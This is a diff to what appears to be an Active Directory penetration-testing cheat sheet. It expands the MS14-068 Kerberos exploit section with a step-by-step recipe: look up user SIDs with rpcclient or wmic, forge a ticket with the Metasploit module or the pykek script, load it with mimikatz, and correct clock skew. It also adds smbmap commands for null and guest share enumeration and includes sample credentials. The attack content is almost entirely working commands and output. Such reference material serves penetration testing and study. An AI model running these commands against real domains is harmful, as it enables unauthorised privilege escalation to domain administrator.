@@ -101,23 +101,73 @@
 
 ### MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)
 
-```bash
-Exploit Python: https://www.exploit-db.com/exploits/35474/
-Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
-Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.
 
-git clone https://github.com/bidord/pykek
+```powershell
+# remote
+rpcclient $> lookupnames john.smith
+john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
+
+# loc
+wmic useraccount get name,sid
+Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
+Guest          S-1-5-21-3415849876-833628785-5197346142-501   
+Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
+Guest          S-1-5-21-297520375-2634728305-5197346142-501   
+krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
+lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
+```
+
+```bash
+Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
+```
+
+Generate a ticket with `metasploit` or `pykek`
+
+```powershell
+Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+   Name      Current Setting                                Required  Description
+   ----      ---------------                                --------  -----------
+   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
+   PASSWORD  P@ssw0rd                                       yes       The Domain User password
+   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
+   RPORT     88                                             yes       The target port
+   Timeout   10                                             yes       The TCP timeout to establish connection and read data
+   USER      lambda                                         yes       The Domain User
+   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000
+```
+
+```powershell
+# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+git clone https://github.com/SecWiki/windows-kernel-exploits
 python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
 python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
+python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
+```
+
+Then use `mimikatz` to load the ticket.
+
+```powershell
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 ```
+
+:warning: If the clock is skewed use `clock-skew.nse` script from `nmap`
+
+```powershell
+$ nmap -sV -sC 10.10.10.10
+clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
+
+$ sudo date -s "14 APR 2015 18:25:16" 
+```
+
 
 ### Open Shares
 
 ```powershell
-smbmap -H 10.10.10.100    # null session
-smbmap -H 10.10.10.100 -R # recursive listing
-smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+smbmap -H 10.10.10.10                # null session
+smbmap -H 10.10.10.10 -R             # recursive listing
+smbmap -H 10.10.10.10 -u invaliduser # guest smb session
+smbmap -H 10.10.10.10 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 ```
 
 or 
@@ -654,3 +704,4 @@ Most of the time the best passwords to spray are :
 * [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
 * [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
 * [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
+* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
